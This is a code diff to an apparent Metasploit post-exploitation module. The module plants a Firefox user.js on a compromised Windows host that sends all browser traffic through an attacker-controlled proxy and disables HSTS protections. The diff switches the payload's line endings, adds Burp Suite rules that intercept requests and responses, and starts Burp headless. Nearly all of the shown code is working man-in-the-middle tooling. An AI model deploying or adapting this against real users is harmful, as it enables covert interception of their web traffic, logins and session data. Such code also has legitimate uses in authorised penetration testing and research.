@@ -43,25 +43,25 @@ class MetasploitModule < Msf::Post
         host = datastore['LHOST']
         port = datastore['LPORT']
         payload = "
-user_pref(\"network.proxy.backup.ftp\", \"#{host}\");\n
-user_pref(\"network.proxy.backup.ftp_port\", #{port});\n
-user_pref(\"network.proxy.backup.socks\", \"#{host}\");\n
-user_pref(\"network.proxy.backup.socks_port\", #{port});\n
-user_pref(\"network.proxy.backup.ssl\", \"#{host}\");\n
-user_pref(\"network.proxy.backup.ssl_port\", #{port});\n
-user_pref(\"network.proxy.ftp\", \"#{host}\");\n
-user_pref(\"network.proxy.ftp_port\", #{port});\n
-user_pref(\"network.proxy.http\", \"#{host}\");\n
-user_pref(\"network.proxy.http_port\", #{port});\n
-user_pref(\"network.proxy.no_proxies_on\", \"\");\n
-user_pref(\"network.proxy.share_proxy_settings\", true);\n
-user_pref(\"network.proxy.socks\", \"#{host}\");\n
-user_pref(\"network.proxy.socks_port\", #{port});\n
-user_pref(\"network.proxy.ssl\", \"#{host}\");\n
-user_pref(\"network.proxy.ssl_port\", #{port});\n
-user_pref(\"network.proxy.type\", 1);\n
-user_pref(\"security.mixed_content.send_hsts_priming\", false);\n
-user_pref(\"security.mixed_content.use_hsts\", false);\n"
+user_pref(\"network.proxy.backup.ftp\", \"#{host}\");\r\n
+user_pref(\"network.proxy.backup.ftp_port\", #{port});\r\n
+user_pref(\"network.proxy.backup.socks\", \"#{host}\");\r\n
+user_pref(\"network.proxy.backup.socks_port\", #{port});\r\n
+user_pref(\"network.proxy.backup.ssl\", \"#{host}\");\r\n
+user_pref(\"network.proxy.backup.ssl_port\", #{port});\r\n
+user_pref(\"network.proxy.ftp\", \"#{host}\");\r\n
+user_pref(\"network.proxy.ftp_port\", #{port});\r\n
+user_pref(\"network.proxy.http\", \"#{host}\");\r\n
+user_pref(\"network.proxy.http_port\", #{port});\r\n
+user_pref(\"network.proxy.no_proxies_on\", \"\");\r\n
+user_pref(\"network.proxy.share_proxy_settings\", true);\r\n
+user_pref(\"network.proxy.socks\", \"#{host}\");\r\n
+user_pref(\"network.proxy.socks_port\", #{port});\r\n
+user_pref(\"network.proxy.ssl\", \"#{host}\");\r\n
+user_pref(\"network.proxy.ssl_port\", #{port});\r\n
+user_pref(\"network.proxy.type\", 1);\r\n
+user_pref(\"security.mixed_content.send_hsts_priming\", false);\r\n
+user_pref(\"security.mixed_content.use_hsts\", false);\r\n"
         #print_status(payload)
         res = write_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\user.js", payload)
         if res.nil?
@@ -99,7 +99,62 @@ user_pref(\"security.mixed_content.use_hsts\", false);\n"
                 \"listener_port\":#{datastore['LPORT']},
                 \"running\":true
             }
-        ]
+        ],
+	\"intercept_client_requests\":{
+            \"automatically_fix_missing_or_superfluous_new_lines_at_end_of_request\":false,
+            \"automatically_update_content_length_header_when_the_request_is_edited\":true,
+            \"do_intercept\":true,
+            \"rules\":[
+                {
+                    \"boolean_operator\":\"and\",
+                    \"enabled\":true,
+                    \"match_condition\":\"(^gif$|^jpg$|^png$|^css$|^js$|^ico$)\",
+                    \"match_relationship\":\"does_not_match\",
+                    \"match_type\":\"file_extension\"
+                },
+                {
+                    \"boolean_operator\":\"and\",
+                    \"enabled\":true,
+                    \"match_condition\":\"^detectportal\\\\\\.firefox\\\\\\.com$\",
+                    \"match_relationship\":\"does_not_match\",
+                    \"match_type\":\"domain_name\"
+                }
+            ]
+        },
+        \"intercept_server_responses\":{
+            \"automatically_update_content_length_header_when_the_response_is_edited\":true,
+            \"do_intercept\":true,
+            \"rules\":[
+                {
+                    \"boolean_operator\":\"or\",
+                    \"enabled\":true,
+                    \"match_condition\":\"text\",
+                    \"match_relationship\":\"matches\",
+                    \"match_type\":\"content_type_header\"
+                },
+                {
+                    \"boolean_operator\":\"or\",
+                    \"enabled\":true,
+                    \"match_relationship\":\"was_intercepted\",
+                    \"match_type\":\"request\"
+                }
+            ]
+        },
+	\"miscellaneous\":{
+            \"disable_logging_to_history_and_site_map\":false,
+            \"disable_out_of_scope_logging_to_history_and_site_map\":false,
+            \"disable_web_interface\":false,
+            \"remove_unsupported_encodings_from_accept_encoding_headers_in_incoming_requests\":true,
+            \"set_connection_close_header_on_requests\":true,
+            \"set_connection_close_header_on_responses\":false,
+            \"strip_proxy_headers_in_incoming_requests\":true,
+            \"strip_sec_websocket_extensions_headers_in_incoming_requests\":true,
+            \"suppress_burp_error_messages_in_browser\":false,
+            \"unpack_gzip_deflate_in_requests\":false,
+            \"unpack_gzip_deflate_in_responses\":true,
+            \"use_http_10_in_requests_to_server\":false,
+            \"use_http_10_in_responses_to_client\":false
+        }
     },
 
     \"project_options\":{
@@ -184,6 +239,7 @@ user_pref(\"security.mixed_content.use_hsts\", false);\n"
 
     	# Run burp headless with the generated config file
         buildConfig()
+	print_status("Starting headless Burp")
         system("java -Djava.awt.headless=true -Xmx1g -jar #{datastore['BURP_LOC']}/#{datastore['BURP_NAME']} --config-file=#{datastore['BURP_LOC']}/config.json")
 
     end
